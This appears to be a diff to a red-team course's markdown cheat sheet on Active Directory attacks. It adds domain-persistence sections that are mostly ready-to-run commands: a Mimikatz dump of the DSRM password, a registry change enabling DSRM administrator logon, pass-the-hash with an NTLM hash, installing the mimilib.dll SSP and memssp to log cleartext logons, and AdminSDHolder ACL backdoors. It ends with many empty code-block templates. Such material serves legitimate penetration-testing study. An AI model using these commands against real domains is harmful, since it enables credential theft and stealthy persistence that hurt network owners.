@@ -16,7 +16,11 @@
 * [Domain Persistence](#Domain-Persistence)
    * [Golden Ticket](#Golden-Ticket) 
    * [Silver Ticket](#Silver-Ticket)
-   * [Skeleton Key](#Silver-Ticket)
+   * [Skeleton Key](#Skeleton-Key)
+   * [DSRM](#DSRM)
+   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
+   * [ACL](#ACL)
+      * [AdminSDHolder](#AdminSDHolder)
 
 
 # General
@@ -444,3 +448,126 @@ Invoke-MimiKatz -Command ‘”privilege::debug” “misc::skeleton”’ -Comp
 
 #access any machine with the password mimikatz
 ```
+
+## DSRM
+Directory Services Restore Mode
+#### Dump DSRM password - dumps local users
+```
+#look for the local administrator password
+Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername dcorp-dc
+```
+
+#### Change login behavior for the local admin on the DC
+```
+New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
+
+#If already exists
+Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
+```
+
+#### Pass the hash for local admin
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+
+## Custom SSP - Track logons
+A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP packages by Microsoft are: NTLM, Kerberos, Wdigest, credSSP. Mimikatz provides a custom SSP – mimilib.dll . This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+
+#### Mimilib.dll
+Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
+```
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' Value $packages
+```
+
+#### Use mimikatz to inject into lsass
+```
+Invoke-Mimikatz -Command ‘”misc:memssp”’
+
+#all logons are logged to C:\Windows\System32\kiwissp.log
+```
+
+## ACL
+### AdminSDHolder
+#### Check if student has replication rights
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student244") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+```
+
+#### Add fullcontrol permissions for a user to the adminSDHolder
+```
+Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName student244 -Rights All -Verbose
+```
+
+#### Run SDProp op AD
+```
+Invoke-SDPropagator -showProgress -timeoutMinutes 1
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
